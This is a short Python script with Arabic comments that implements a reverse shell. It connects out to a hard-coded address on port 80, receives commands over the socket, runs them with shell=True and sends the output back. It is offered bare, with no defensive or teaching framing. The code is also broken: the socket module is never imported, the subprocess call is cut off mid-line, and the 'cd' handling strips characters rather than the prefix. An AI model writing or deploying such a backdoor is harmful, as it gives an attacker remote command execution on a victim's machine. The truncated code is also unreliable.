import subprocess
import os

def connect():
    # الاتصال بالعنوان والرقم المحددين
    s = socket.socket()
    s.connect(("0.0.0.0", 80))

    while True:
        # استقبال الأوامر من الخادم
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            break

        # تنفيذ الأمر
        if command.startswith("cd "):
            try:
                os.chdir(command.strip("cd "))
                s.send(b"Changed directory")
            except FileNotFoundError as e:
                s.send(str(e).encode())
        else:
            output = subprocess.run(command, shell=True, c>
            s.send(output.stdout + output.stderr)

    s.close()

if __name__ == "__main__":
    connect()

